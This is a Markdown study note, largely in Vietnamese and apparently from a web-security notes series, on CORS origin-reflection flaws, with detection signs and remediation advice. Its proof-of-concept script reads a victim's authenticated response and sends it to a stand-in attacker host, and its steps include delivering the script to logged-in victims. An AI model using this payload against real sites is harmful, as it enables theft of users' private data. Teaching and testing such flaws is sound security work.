# CORS Vulnerability: Origin Reflection

## Vulnerability Pattern

Server nhận `Origin` từ request và phản hồi lại y chang trong `Access-Control-Allow-Origin`, thường kèm `Access-Control-Allow-Credentials: true`.

## Vulnerable Exchange

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

## Why This Is Exploitable

- Browser xem attacker origin là trusted do `ACAO` khớp.
- Cookies/session của nạn nhân được gửi do `withCredentials` + `ACAC: true`.
- JavaScript trên attacker site đọc được response chứa dữ liệu nhạy cảm.

## PoC Pattern

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    location =
      "https://attacker.example/log?d=" + encodeURIComponent(this.responseText);
  };
  req.open("GET", "https://vulnerable-website.com/sensitive-victim-data", true);
  req.withCredentials = true;
  req.send();
</script>
```

## Exploitation Sequence

1. Xác định endpoint nhạy cảm trả CORS headers.
2. Thử `Origin: https://attacker.com` trong repeater/proxy.
3. Nếu `ACAO` reflect và có `ACAC: true`, dùng browser PoC.
4. Deliver PoC cho nạn nhân đang đăng nhập.
5. Thu dữ liệu exfiltrate và đánh giá impact.

## Detection Heuristics

| Signal                                  | Interpretation                        |
| --------------------------------------- | ------------------------------------- |
| `ACAO` thay đổi theo mọi origin gửi lên | Reflection khả năng cao               |
| Có `ACAC: true`                         | Có khả năng đọc dữ liệu authenticated |
| Endpoint trả profile/token/api-key      | Impact cao                            |

## Remediation

- Không reflect `Origin` một cách động.
- Chỉ cho phép origin trong allowlist chính xác.
- Nếu cần credentials, allowlist phải exact và kiểm soát chặt.
- Tiếp tục enforce authZ server-side dù CORS đúng/sai.

## Related Files

- [Misconfiguration Root Causes](05-misconfiguration-root-causes.md)
- [Exploitation Workflows](11-exploitation-workflows.md)
- [Defense and Mitigation](13-defense-mitigation.md)
